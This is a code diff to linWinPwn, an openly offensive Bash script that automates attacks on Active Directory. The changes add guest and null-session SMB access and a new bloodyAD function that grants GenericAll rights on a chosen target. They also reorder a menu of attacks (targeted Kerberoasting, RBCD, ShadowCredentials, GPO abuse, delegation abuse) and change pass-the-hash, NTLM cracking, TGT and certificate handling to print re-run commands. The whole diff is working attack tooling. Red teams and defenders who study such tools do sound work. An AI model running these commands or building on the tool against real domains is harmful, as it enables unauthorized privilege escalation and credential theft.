@@ -132,7 +132,7 @@ print_banner () {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.12 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.13 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -270,7 +270,7 @@ prepare (){
         fi
     fi
 
-    if [ "${user}" == "" ]; then user_out="null"; else user_out=${user}; fi
+    if [ "${user}" == "" ]; then user_out="null"; else user_out=$(echo ${user} | tr -dc '[:alnum:]\n\r'); fi
     output_dir="${output_dir}/linWinPwn_${dc_domain}_${user_out}"
     command_log="$output_dir/$(date +%Y-%m-%d)_command.log"
     servers_ip_list="${output_dir}/DomainRecon/Servers/ip_list_${dc_domain}.txt"
@@ -366,6 +366,7 @@ authenticate (){
             argument_imp_gp="${domain}/"
             argument_ldeep="-d ${dc_domain} -a"
             argument_pre2k="-d ${domain}"
+            argument_p0dalirius="-d ${domain} -u Guest -p ''"
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}null session ${NC}"
         fi
 
@@ -562,7 +563,7 @@ authenticate (){
                     echo -e "${PURPLE}[-] smbpasswd does not support Kerberos authentication${NC}"
                 else
                     pass_passchange=""
-                    if [ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ]; then
+                    if [[ $auth_check == *"STATUS_PASSWORD_MUST_CHANGE"* ]]; then
                         echo -e "${BLUE}[*] Changing expired password of own user. Please specify new password:${NC}"
                         read -p ">> " pass_passchange </dev/tty
                         while [ "${pass_passchange}" == "" ] ; do
@@ -571,7 +572,7 @@ authenticate (){
                         done
                         echo -e "${CYAN}[*] Changing password of ${user} to ${pass_passchange}${NC}"
                         run_command "${impacket_smbpasswd} ${argument_imp}\\@${dc_ip} -newpass ${pass_passchange}" | tee -a ${output_dir}/Modification/impacket_smbpasswd_${dc_domain}.txt
-                    elif [ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]; then
+                    elif [[ $auth_check == *"STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT"* ]]; then
                         echo -e "${BLUE}[*] Changing password of pre created computer account. Please specify new password:${NC}"
                         read -p ">> " pass_passchange </dev/tty
                         while [ "${pass_passchange}" == "" ] ; do
@@ -597,6 +598,7 @@ authenticate (){
                     fi
                     password="${pass_passchange}"
                     auth_check=""
+                    prepare
                     authenticate
                 fi
                 echo -e ""
@@ -2118,8 +2120,6 @@ manspider_scan () {
 smbclient_console () {
     if [ ! -f "${impacket_smbclient}" ]; then
         echo -e "${RED}[-] smbclient.py not found! Please verify the installation of impacket ${NC}"
-    elif [ "${nullsess_bool}" == true ]; then
-        echo -e "${PURPLE}[-] smbclient requires credentials${NC}"
     else
         echo -e "${BLUE}Please specify target IP or hostname:${NC}"
         read -p ">> " smbclient_target </dev/tty
@@ -2128,7 +2128,11 @@ smbclient_console () {
             read -p ">> " smbclient_target </dev/tty
         done
         echo -e "${BLUE}[*] Opening smbclient.py console on target: $smbclient_target ${NC}"
-        run_command "${impacket_smbclient} ${argument_imp}\\@${smbclient_target}" 2>&1 | tee -a ${output_dir}/Shares/impacket_smbclient_output.txt
+        if [ "${nullsess_bool}" == true ]; then
+            run_command "${impacket_smbclient} ${argument_imp}Guest:''\\@${smbclient_target}" 2>&1 | tee -a ${output_dir}/Shares/impacket_smbclient_output.txt
+        else
+            run_command "${impacket_smbclient} ${argument_imp}\\@${smbclient_target}" 2>&1 | tee -a ${output_dir}/Shares/impacket_smbclient_output.txt
+        fi
     fi
     echo -e ""
 }
@@ -2138,18 +2142,14 @@ smbclientng_console () {
         echo -e "${RED}[-] Please verify the installation of smbclientng${NC}"
     else
         echo -e "${BLUE}[*] Launching smbclientng${NC}"
-        if [ "${nullsess_bool}" == true ] ; then
-            echo -e "${PURPLE}[-] smbclientng requires credentials ${NC}"
-        else
-            echo -e "${BLUE}Please specify target IP or hostname:${NC}"
+        echo -e "${BLUE}Please specify target IP or hostname:${NC}"
+        read -p ">> " smbclient_target </dev/tty
+        while [ "${smbclient_target}" == "" ] ; do
+            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
             read -p ">> " smbclient_target </dev/tty
-            while [ "${smbclient_target}" == "" ] ; do
-                echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
-                read -p ">> " smbclient_target </dev/tty
-            done
-            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
-            run_command "${smbclientng} ${argument_p0dalirius} ${verbose_p0dalirius} --target ${smbclient_target} --kdcHost ${dc_FQDN}" 2>&1 | tee -a ${output_dir}/Shares/smbclientng_output_${dc_domain}.txt
-        fi
+        done
+        if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
+        run_command "${smbclientng} ${argument_p0dalirius} ${verbose_p0dalirius} --target ${smbclient_target} --kdcHost ${dc_FQDN}" 2>&1 | tee -a ${output_dir}/Shares/smbclientng_output_${dc_domain}.txt
     fi
     echo -e ""
 }
@@ -2535,7 +2535,7 @@ change_owner () {
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"           
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
-            echo -e "${BLUE}[*] Changing owner of a user or computer account. Please specify target:${NC}"
+            echo -e "${BLUE}[*] Changing owner of a user, computer, group, etc. Please specify target:${NC}"
             target_ownerchange=""
             read -p ">> " target_ownerchange </dev/tty
             while [ "${target_ownerchange}" == "" ] ; do
@@ -2544,6 +2544,29 @@ change_owner () {
             done
             echo -e "${CYAN}[*] Changing Owner of ${target_ownerchange} to ${user}${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} set owner ${target_ownerchange} ${user}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_ownerchange_${dc_domain}.txt 
+       fi
+    fi
+    echo -e ""
+}
+
+add_genericall () {
+    if [ ! -f "${bloodyad}" ] ; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
+    else
+        mkdir -p ${output_dir}/Modification/bloodyAD
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ] ; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"           
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi            
+            echo -e "${BLUE}[*] Adding GenericAll rights of a user, computer, group, etc. Please specify target:${NC}"
+            target_genericall=""
+            read -p ">> " target_genericall </dev/tty
+            while [ "${target_genericall}" == "" ] ; do
+                echo -e "${RED}Invalid name.${NC} Please specify target:"
+                read -p ">> " target_genericall </dev/tty
+            done
+            echo -e "${CYAN}[*] Adding GenericAll rights on ${target_genericall} to ${user}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_ip} add genericAll ${target_genericall} ${user}" 2>&1 | tee -a ${output_dir}/Modification/bloodyAD/bloodyad_out_genericall_${dc_domain}.txt 
        fi
     fi
     echo -e ""
@@ -4385,12 +4408,13 @@ modif_menu () {
     echo -e "3) Add new computer (Requires: MAQ > 0)"
     echo -e "4) Add new DNS entry"
     echo -e "5) Change Owner of target (Requires: WriteOwner permission)"
-    echo -e "6) Targeted Kerberoast Attack (Noisy!)"
-    echo -e "7) Perform RBCD attack (Requires: GenericWrite or GenericAll on computer)"
-    echo -e "8) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)"
-    echo -e "9) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)"
-    echo -e "10) Add Unconstrained Delegation rights (Requires: SeEnableDelegationPrivilege rights)"
-    echo -e "11) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights (Requires: Owner of computer)"
+    echo -e "6) Add GenericAll rights on target (Requires: Owner permission)"
+    echo -e "7) Targeted Kerberoast Attack (Noisy!)"
+    echo -e "8) Perform RBCD attack (Requires: GenericWrite or GenericAll on computer)"
+    echo -e "9) Perform ShadowCredentials attack (Requires: AddKeyCredentialLink)"
+    echo -e "10) Abuse GPO to execute command (Requires: GenericWrite or GenericAll on GPO)"
+    echo -e "11) Add Unconstrained Delegation rights (Requires: SeEnableDelegationPrivilege rights)"
+    echo -e "12) Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights (Requires: Owner of computer)"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -4418,26 +4442,30 @@ modif_menu () {
         modif_menu;;
 
         6)
-        targetedkerberoast_attack
+        add_genericall
         modif_menu;;
 
         7)
-        rbcd_attack
+        targetedkerberoast_attack
         modif_menu;;
 
         8)
-        shadowcreds_attack
+        rbcd_attack
         modif_menu;;
 
         9)
-        pygpo_abuse
+        shadowcreds_attack
         modif_menu;;
 
         10)
-        add_unconstrained
+        pygpo_abuse
         modif_menu;;
 
         11)
+        add_unconstrained
+        modif_menu;;
+
+        12)
         add_spn
         modif_menu;;
 
@@ -4527,11 +4555,11 @@ auth_menu () {
     echo -e ""
     echo -e "${YELLOW}[Auth menu]${NC} Please choose from the following options:"
     echo -e "----------------------------------------------------"
-    echo -e "1) Generate and use NTLM hash of current user (requires: password) - Pass the hash"
-    echo -e "2) Crack NTLM hash of current user and use password (requires: NTLM hash)"
-    echo -e "3) Generate and use TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash"
+    echo -e "1) Generate NTLM hash of current user (requires: password) - Pass the hash"
+    echo -e "2) Crack NTLM hash of current user (requires: NTLM hash)"
+    echo -e "3) Generate TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash"
     echo -e "4) Extract NTLM hash from Certificate using PKINIT (requires: pfx certificate)"
-    echo -e "5) Request and use certificate (requires: authentication)"
+    echo -e "5) Request certificate (requires: authentication)"
     echo -e "back) Go back to Init Menu"
     echo -e "exit) Exit"
 
@@ -4546,11 +4574,9 @@ auth_menu () {
 
         1)
         if [ "${pass_bool}" == true ] ; then
-            hash=":$(iconv -f ASCII -t UTF-16LE <(printf ${password}) | $(which openssl) dgst -md4 | cut -d " " -f 2)"
-            echo -e "${GREEN}[+] NTLM hash generated:${NC} $hash"
-            pass_bool=false
-            hash_bool=true
-            authenticate
+            hash_gen=":$(iconv -f ASCII -t UTF-16LE <(printf ${password}) | $(which openssl) dgst -md4 | cut -d " " -f 2)"
+            echo -e "${GREEN}[+] NTLM hash generated:${NC} $hash_gen"
+            echo -e "${GREEN}[+] Re-run linWinPwn to use hash instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -H ${hash_gen}"
         else
             echo -e "${RED}[-] Error! Requires password...${NC}"
         fi
@@ -4566,11 +4592,9 @@ auth_menu () {
                 run_command "$john ${output_dir}/Credentials/ntlm_hash --format=NT --wordlist=$pass_wordlist" | tee "${output_dir}/Credentials/johnNTLM_output_${dc_domain}"
                 john_out=$($john ${output_dir}/Credentials/ntlm_hash --format=NT --show)
                 if [[ "${john_out}" == *"1 password"* ]]; then
-                    pass_bool=true
-                    hash_bool=false
-                    password=$(echo $john_out | cut -d ":" -f 2 | cut -d " " -f 1)
-                    echo -e "${GREEN}[+] NTLM hash successfully cracked:${NC} $password"
-                    authenticate
+                    password_cracked=$(echo $john_out | cut -d ":" -f 2 | cut -d " " -f 1)
+                    echo -e "${GREEN}[+] NTLM hash successfully cracked:${NC} $password_cracked"
+                    echo -e "${GREEN}[+] Re-run linWinPwn to use password instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -p ${password_cracked}"
                 else
                     echo -e "${RED}[-] Failed to crack NTLM hash${NC}"
                 fi
@@ -4591,14 +4615,9 @@ auth_menu () {
                 run_command "${impacket_getTGT} ${argument_imp} -dc-ip ${dc_ip}" | grep -v "Impacket" | sed '/^$/d' | tee "${output_dir}/Credentials/getTGT_output_${dc_domain}"
                 cd ${current_dir}
                 if [ -f "${output_dir}/Credentials/${user}.ccache" ]; then
-                    krb5cc="${output_dir}/Credentials/${user}.ccache"
-                    pass_bool=false
-                    hash_bool=false
-                    aeskey_bool=false
-                    cert_bool=false
-                    kerb_bool=true
-                    echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb5cc"
-                    authenticate
+                    krb_ticket="${output_dir}/Credentials/${user}.ccache"        
+                    echo -e "${GREEN}[+] TGT generated successfully:${NC} $krb_ticket"
+                    echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -K ${krb_ticket}"
                 else
                     echo -e "${RED}[-] Failed to generate TGT${NC}"
                 fi
@@ -4625,13 +4644,7 @@ auth_menu () {
                 fi
             fi
             echo -e "${CYAN}[*] Extracting NTLM hash from certificate using PKINIT${NC}"
-            pass_bool=false
-            hash_bool=false
-            aeskey_bool=false
-            kerb_bool=false
-            unset KRB5CCNAME
-            cert_bool=true
-            authenticate
+            pkinit_auth
         fi
         echo -e ""
         auth_menu;;
@@ -4658,15 +4671,9 @@ auth_menu () {
                     $(which openssl) pkcs12 -in "${output_dir}/Credentials/${user}.pfx" -out "${output_dir}/Credentials/${user}.pem" -nodes -passin pass:""
                     if [ -f "${output_dir}/Credentials/${user}.pem" ]; then
                         pem_cert="${output_dir}/Credentials/${user}.pem"
-                        echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} ${output_dir}/Credentials/${user}.pem"
+                        echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} ${pem_cert}"
                     fi
-                    pass_bool=false
-                    hash_bool=false
-                    aeskey_bool=false
-                    cert_bool=true
-                    kerb_bool=false
-                    unset KRB5CCNAME
-                    authenticate
+                    echo -e "${GREEN}[+] Re-run linWinPwn to use certificate instead:${NC} linWinPwn.sh -t ${dc_ip} -d ${domain} -u ${user} -C ${pem_cert}"
                 else
                     echo -e "${RED}[-] Failed to request certificate${NC}"
                 fi
